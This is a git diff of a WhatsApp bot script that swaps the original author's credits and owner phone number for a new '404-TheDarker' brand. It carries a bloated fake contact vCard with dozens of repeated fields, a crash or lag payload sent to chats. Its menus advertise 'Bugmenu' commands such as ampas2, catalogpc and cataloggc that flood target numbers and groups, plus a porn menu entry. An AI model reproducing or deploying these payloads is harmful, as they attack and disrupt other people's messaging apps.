karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
+ const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
 haikal.sendContact(m.chat, global.ownerr, fkontaak)
 }
 break
@@ -1903,7 +1903,7 @@ break
 //=================================================//
 case 'donasi': {
 if (isBan) throw sticBanLu(from)
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n⭔ 13k Per Group via E-Walet 1 Month\n⭔ 18k via pulsa 1 Month\n\n Premium Price Bot\n⭔ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6285723156229 (Owner)\n\nDonate For Me : \n\n⭔ Paypal : https://trakteer.id/hw-mods-wa-haikal\n⭔ Saweria : https://saweria.co/hwmodswa` }, { quoted: hw })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n⭔ 13k Per Group via E-Walet 1 Month\n⭔ 18k via pulsa 1 Month\n\n Premium Price Bot\n⭔ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/37122252056 (Owner)\n\nDonate For Me : \n\n⭔ Paypal : https://trakteer.id/hw-mods-wa-haikal\n⭔ Saweria : https://saweria.co/hwmodswa` }, { quoted: hw })
 }
 break
 //=================================================//
@@ -1982,7 +1982,7 @@ const result4 = `*DOWNLOAD MEDIAFIRE*
 *Link* : ${baby1[0].link}\n
 _whoa wait zimbot processing..._
 
-*𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒*`
+*ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶*`
 reply(`${result4}`)
 haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : hw }).catch ((err) => reply('*Failed to download File*'))
 }
@@ -3850,7 +3850,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ┣❏➥ bug7 [ bug mentions ]
 ┗━━⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 WE ARE NOT MASTAH
+
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
 }
 }}}), { userJid: m.chat, quoted: m })
@@ -3867,7 +3867,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
 "title": ` © Hola ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu 🙏`,
-"description": ` - © 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 -
+"description": ` - © ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ -
 
 ◎ Owner : ${botname}
 ◎ Lib : Multi-Device
@@ -3880,10 +3880,10 @@ SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIH LANJUT ✌️`,
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 WE ARE NOT MASTAH`,
-"url": "Wa.me/6285723156229"
+"retailerId": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ WE ARE NOT MASTAH!!!`,
+"url": "Wa.me/37122252056"
 },  
-"businessOwnerJid": "6285723156229@s.whatsapp.net",
+"businessOwnerJid": "37122252056@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: hw })
 haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -3905,7 +3905,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧  ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
 *[ 🌷 ] soundbot* 
  
 kal
@@ -3921,10 +3921,10 @@ cantik
 kesel
 ngeselin
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -3946,7 +3946,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
  *[ 🌷 ] funnmenu* 
 bagaimanakah
 kapankah
@@ -3971,10 +3971,10 @@ holoh
 delttt
 suitpvp [@tag]
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -3995,7 +3995,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
 *[ 🌷 ] Bugmenu*
 
 Bug Cr Vip [ true / false ]
@@ -4035,9 +4035,9 @@ ampas2 [Contoh : Ampas2 112674448xxx ]
 catalogpc [ Contoh : catalogpc 628xxx@s.whatsapp.net|10|10s ]
 cataloggc [ Contoh : cataloggc 1237891xxxx@g.us|10|10s ]
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-𝑊𝑎𝑙𝑧 SAID WE ARE NOT MASTAH!!!`,
+ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ WE ARE NOT MASTAH!!!`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4058,7 +4058,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Owner : ${botname}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
  *[ 🌷 ] primbonmenu* 
 nomorhoki
  artimimpi
@@ -4091,10 +4091,10 @@ nomorhoki
  zodiak
  shio
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4116,7 +4116,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
 *[ 🌷 ] islamiyah* 
 iqra
  hadist
@@ -4124,10 +4124,10 @@ iqra
  juzamma
  tafsirsurah
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©c`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4149,7 +4149,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
 *[ 🌷 ] soundbot* 
  
  *[ 🌷 ] beritanews* 
@@ -4169,10 +4169,10 @@ antara-news
 cnn-news
 fajar-news 
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4195,7 +4195,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
 *[ 🌷 ] soundbot* 
  
  *[ 🌷 ] Group Menu* 
@@ -4223,10 +4223,10 @@ linkgroup
  penjara
  intro
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4248,7 +4248,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
  *[ 🌷 ] Voice Changer* 
 bass
 blown
@@ -4262,10 +4262,10 @@ robot
 slow
 tupai
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4286,7 +4286,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
  *[ 🌷 ] Asupan Mata* 
 asupan
 asupanukhty
@@ -4301,10 +4301,10 @@ cecan-jepan
 cecan
 bokep
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4326,7 +4326,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
 *[ 🌷 ] Search Menu* 
 yts [query]
 google [query]
@@ -4338,10 +4338,10 @@ ytsearch [query]
 ringtone [query]
 searchgroups [query]
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
